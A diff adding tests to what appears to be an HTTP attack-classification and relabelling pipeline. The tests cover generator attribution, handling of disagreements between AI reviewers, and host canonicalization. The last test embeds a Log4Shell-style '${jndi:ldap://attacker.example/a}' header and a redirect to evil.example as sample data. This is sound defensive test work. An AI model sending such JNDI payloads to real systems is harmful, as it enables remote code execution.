@@ -302,6 +302,7 @@ def test_generator_from_round_tag():
     assert generator_of("benign_hard_negative_dev.vsn01.jsonl") == "sonnet-5.5"
     assert generator_of("ssti.vcx23.jsonl") == "codex-gpt-6.1-sol"
     assert generator_of("ssti.vs1w02.jsonl") == "haiku-5.5"
+    assert generator_of("benign_standard_traffic.vgm44_path_traversal_lfi.jsonl") == "gemini-3.8-flash"
 
 
 def test_apply_hn_never_demotes_attacks(tmp_path, monkeypatch):
@@ -311,6 +312,9 @@ def test_apply_hn_never_demotes_attacks(tmp_path, monkeypatch):
     (tmp_path / "out").mkdir()
     (tmp_path / "out" / "codex__batch_0.jsonl").write_text("".join(json.dumps({"rid": r, "predicted_class": p}) + "\n" for r, p in
         [("h0", "benign_standard_traffic"), ("h1", "benign_standard_traffic"), ("h2", "xxe")]))
+    # a second reviewer agreeing with every label must not erase the first one's disputes (read order is arbitrary)
+    (tmp_path / "out" / "gemini__batch_0.jsonl").write_text("".join(json.dumps({"rid": r, "predicted_class": p}) + "\n" for r, p in
+        [("h0", "jwt_auth_bypass"), ("h1", "benign_standard_traffic"), ("h2", "benign_standard_traffic")]))
     (tmp_path / "key.json").write_text(json.dumps(key))
     monkeypatch.setattr(R, "XM", tmp_path)
     monkeypatch.setattr(R, "XM_KEY", tmp_path / "key.json")
@@ -318,6 +322,10 @@ def test_apply_hn_never_demotes_attacks(tmp_path, monkeypatch):
     R.apply_hn()
     assert json.loads((tmp_path / "relabel.json").read_text()) == {
         "a:0": "__quarantine__", "b:0": "benign_standard_traffic", "c:0": "__quarantine__"}
+    (tmp_path / "relabel.json").unlink()  # reviewers split on a benign -> benign move: no relabel
+    (tmp_path / "out" / "gemini__batch_0.jsonl").write_text(json.dumps({"rid": "h1", "predicted_class": "benign_hard_negative_dev"}) + "\n")
+    R.apply_hn()
+    assert "b:0" not in json.loads((tmp_path / "relabel.json").read_text())
 
 
 def test_decoded_views_jwt_base64_and_limits():
@@ -364,3 +372,12 @@ def test_budget_windows_collapse_padding_and_window_long_bodies():
     text = " ".join(f"word{i}" for i in range(4000)) + " TAIL-MARK"
     ws = budget_windows({"http": {"target": "/f", "headers": [], "body": text}}, count)
     assert 1 < len(ws) <= 8 and all(count(x) <= 2048 for x in ws) and "TAIL-MARK" in ws[-1]["http"]["body"]
+
+
+def test_canonicalize_replaces_attack_only_placeholder_hosts():
+    from subagents.orchestrator import canonicalize
+    tel = {"schema_version": 1, "mode": "L7_HTTP", "decision_stage": "request_received", "observed_until": "x",
+           "http": {"protocol": "HTTP/1.1", "method": "GET", "path": "/a",
+                    "headers": [["X-Api-Version", "${jndi:ldap://attacker.example/a}"]], "query": "u=%2F%2Fevil.example%2Fx"}}
+    s = json.dumps(canonicalize(tel, "k1"))
+    assert "attacker" not in s and "evil." not in s and "${jndi:ldap://" in s
